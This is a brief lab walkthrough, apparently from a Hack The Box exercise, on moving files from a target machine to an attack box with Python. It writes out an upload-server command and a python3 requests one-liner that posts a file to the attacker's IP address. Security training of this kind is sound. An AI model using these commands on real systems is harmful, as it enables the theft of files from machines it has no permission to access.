1.The Goal: using python3 to extract files from target machine and upload them into your attack machine

1.on your attack box start the upload server:
	a. python3 -m uploadserver
2.ssh into target machine 
	a. ssh htb-student@10.129.234.168
3.on the target machine send the file to you attach box
	a.python3 -c 'import requests;requests.post("http://10.10.14.16:8000/upload",files={"files":open("README.license","rb")})'
	
	Machine B (10.129.234.168) ──── README.license ────► Machine A (10.10.14.16)